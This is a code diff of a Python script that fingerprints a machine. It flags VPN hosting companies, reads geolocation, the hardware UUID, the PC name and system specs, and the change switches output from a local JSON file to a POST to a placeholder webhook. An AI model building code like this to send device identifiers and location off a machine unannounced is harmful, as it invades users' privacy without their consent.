@@ -31,49 +31,26 @@ elif abuser_score == "Very Low":
 else:
     networkSuspicious: False
 
-if "M247" in company:
-    is_vpn = True
-    vpn_provider = ["Proton", "Kaspersky"]
-    networkSuspicious = True
+if "M247" in company: vpn_provider = ["Proton", "Kaspersky"]
+elif "Datacamp" in company: vpn_provider = ["Proton"]
+elif "NForce" in company: vpn_provider = ["Proton"]
+elif "WorldStream" in company: vpn_provider = ["Proton"]
+elif "EstNOC" in company: vpn_provider = ["Proton"]
+elif "Farice" in company: vpn_provider = ["Proton"]
+elif "Host Universal" in company: vpn_provider = ["Proton"]
+elif "Anchorfree" in company: vpn_provider = ["Kaspersky", "Hotspot Shield"]
+elif "Latitude.sh" in company: vpn_provider = ["Kaspersky"]
+elif "Latitude.sh" in company: vpn_provider = ["Kaspersky"]
+elif "TR1 Net" in company: vpn_provider = ["Kaspersky"]
+elif "Leaseweb" in company: vpn_provider = ["Kaspersky"]
+elif "20 Point" in company: vpn_provider = ["Kaspersky"]
+elif "24SHELLS" in company: vpn_provider = ["Kaspersky"]
+elif "Private Customer" in company: vpn_provider = ["Kaspersky"]
 
-elif "Latitude.sh" in company:
+if vpn_provider == []:
+    pass
+else:
     is_vpn = True
-    vpn_provider = ["Kaspersky"]
-    networkSuspicious = True
-
-elif "Private Customer" in company:
-    is_vpn = True
-    vpn_provider = ["Kaspersky"]
-    networkSuspicious = True
-
-elif "Anchorfree" in company:
-    is_vpn = True
-    vpn_provider = ["Kaspersky", "Hotspot Shield"]
-    networkSuspicious = True
-
-elif "TR1 Net" in company:
-    is_vpn = True
-    vpn_provider =  ["Kaspersky"]
-    networkSuspicious = True
-
-elif "Leaseweb" in company:
-    is_vpn = True
-    vpn_provider = ["Kaspersky"]
-    networkSuspicious = True
-
-elif "WorldStream" in company:
-    is_vpn = True
-    vpn_provider = ["Proton"]
-    networkSuspicious = True
-
-elif "20 Point Networks" in company:
-    is_vpn = True
-    vpn_provider = ["Kaspersky"]
-    networkSuspicious = True
-    
-elif "24SHELLS" in company:
-    is_vpn = True
-    vpn_provider = ["Kaspersky"]
     networkSuspicious = True
 
 #! Set network (Geolocation) data
@@ -88,21 +65,24 @@ timezone = api['location']['timezone']
 try:
     uuid = check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
 except:
-    uuid = "None found"
+    uuid = "None"
 ram_GiB = ram.total / (1024**3)
 ram_GB = ram.total / (1000**3)
 cpu_threads = cpu_count()
+cpu_technical = p.processor()
 
 #! Set software (operating system) data
 arch = p.architecture()[0]
 release = p.release()
 version = p.version()
 edition = p.win32_edition()
-pc_name = p.node()
 operating_system = p.system()
 
+#! Personal data
+pc_name = p.node()
+
 #! Export session
-'''
+
 data = {
     "network":{
         "ip":ip,
@@ -122,56 +102,23 @@ data = {
     },
     "hardware":{
         "uuid":uuid,
+        "cpu_technical":cpu_technical,
         "threads":cpu_threads,
         "ram_GiB":ram_GiB,
         "ram_GB":ram_GB
     },
     "software":{
         "operating_system":operating_system,
-        "pc_name":pc_name,
         "release":release,
         "version":version,
         "edition":edition,
         "arch":arch,
         "app_version":app_version
+    },
+    "personal":{
+        "pc_name":pc_name
     }
 }
 
 webhook_url = "YOUR_WEBHOOK_URL"
 response = post(webhook_url, json=data)
-'''
-
-with open('info.json', 'w', encoding='utf-8') as f:
-    f.write('{\n')
-    f.write('\t"network":{\n')
-    f.write(f'\t\t"ip":"{ip}",\n')
-    f.write(f'\t\t"is_tor":{is_tor},\n'.lower())
-    f.write(f'\t\t"is_vpn":{is_vpn},\n'.lower())
-    f.write(f'\t\t"company":"{company}",\n')
-    f.write(f'\t\t"suspicious":{networkSuspicious},\n'.lower())
-    f.write(f'\t\t"vpn_provider":{vpn_provider}\n'.replace("'", '"'))
-    f.write('\t},\n')
-    f.write('\t"geolocation":{\n')
-    f.write(f'\t\t"country":"{country}",\n')
-    f.write(f'\t\t"city":"{city}",\n')
-    f.write(f'\t\t"latitude":"{latitude}",\n')
-    f.write(f'\t\t"longitude":"{longitude}",\n')
-    f.write(f'\t\t"zip_code":"{zip_code}",\n')
-    f.write(f'\t\t"timezone":"{timezone}"\n')
-    f.write('\t},\n')
-    f.write('\t"hardware":{\n')
-    f.write(f'\t\t"uuid":"{uuid}",\n')
-    f.write(f'\t\t"threads":"{cpu_threads}",\n')
-    f.write(f'\t\t"ram_GiB":"{ram_GiB}",\n')
-    f.write(f'\t\t"ram_GB":"{ram_GB}"\n')
-    f.write('\t},\n')
-    f.write('\t"software":{\n')
-    f.write(f'\t\t"operating_system":"{operating_system}",\n')
-    f.write(f'\t\t"pc_name":"{pc_name}",\n')
-    f.write(f'\t\t"release":"{release}",\n')
-    f.write(f'\t\t"version":"{version}",\n')
-    f.write(f'\t\t"edition":"{edition}",\n')
-    f.write(f'\t\t"arch":"{arch}",\n')
-    f.write(f'\t\t"app_version":"{app_version}"\n')
-    f.write('\t}\n')
-    f.write('}\n')
